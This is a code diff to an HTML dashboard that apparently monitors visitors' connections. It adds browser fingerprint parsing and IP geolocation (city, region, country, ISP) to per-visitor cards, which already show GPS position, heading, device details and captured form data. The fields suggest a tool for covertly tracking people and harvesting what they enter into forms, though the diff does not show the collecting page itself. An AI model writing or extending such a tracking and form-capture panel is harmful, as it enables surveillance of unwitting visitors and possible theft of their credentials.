@@ -2,6 +2,7 @@
 <html lang="en">
 
 <head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.37/ua-parser.min.js"></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" type="image/png" href="data:image/png;base64,">
@@ -1343,6 +1344,7 @@
           if (loc.heading !== null && loc.heading !== undefined) locExtras.push(`Heading: ${Math.round(loc.heading)}°`);
 
           if (locExtras.length) lines.push(`<span style="opacity:0.75;font-size:0.9em;">↳ ${locExtras.join(' · ')}</span>`);
+          if (loc.city || loc.isp) lines.push(`<span style="opacity:0.75;font-size:0.9em;">↳ ${loc.city || ''}${loc.region ? ', ' + loc.region : ''}${loc.country ? ' ' + loc.country : ''} ${loc.isp ? '· ' + loc.isp : ''}</span>`);
         } else {
           lines.push(`<strong><span class="loc" style="color:#f59e0b">📍 IP-GEO:</span></strong> ${loc.city || 'Unknown City'}, ${(loc.region || '')} ${loc.country || 'Unknown Country'} &nbsp;<a href="${loc.mapsLink}" target="_blank" style="color:#3b82f6">[maps]</a>`);
           if (loc.ip) lines.push(`<span style="opacity:0.75;font-size:0.9em;">↳ IP: ${loc.ip} (${loc.org || loc.isp || 'Unknown ISP'})</span>`);
@@ -1547,7 +1549,7 @@
           }
 
           if (msg.type === 'location') {
-            connections[id].location = msg;
+            connections[id].location = { ...(connections[id]._ipGeo || {}), ...msg };
             getOrCreateCard(id);
             updateCardInfo(id);
             geoTotal++;
@@ -1556,10 +1558,23 @@
 
           if (msg.type === 'device_info') {
             connections[id].device = msg;
+            try { const p = new UAParser(msg.userAgent).getResult(); connections[id].device.browser = p.browser.name + (p.browser.version ? " " + p.browser.version.split(".")[0] : ""); connections[id].device.os = p.os.name + (p.os.version ? " " + p.os.version : ""); connections[id].device.deviceType = p.device.type ? p.device.type.charAt(0).toUpperCase() + p.device.type.slice(1) : "Desktop"; connections[id].device.memory = msg.deviceMemory; connections[id].device.cores = msg.hardwareConcurrency; } catch(e) {}
             getOrCreateCard(id);
             updateCardInfo(id);
           }
 
+          if (msg.type === 'ip_geo') {
+            if (!connections[id]) connections[id] = {};
+            if (!connections[id].location) connections[id].location = {};
+            connections[id].location.city = msg.city;
+            connections[id].location.region = msg.region;
+            connections[id].location.country = msg.country;
+            connections[id].location.isp = msg.isp;
+            connections[id].location.org = msg.org;
+            connections[id]._ipGeo = { city: msg.city, region: msg.region, country: msg.country, isp: msg.isp, org: msg.org };
+            getOrCreateCard(id);
+            updateCardInfo(id);
+          }
           if (msg.type === 'form_data') {
             connections[id].form = { ...msg };
             getOrCreateCard(id);
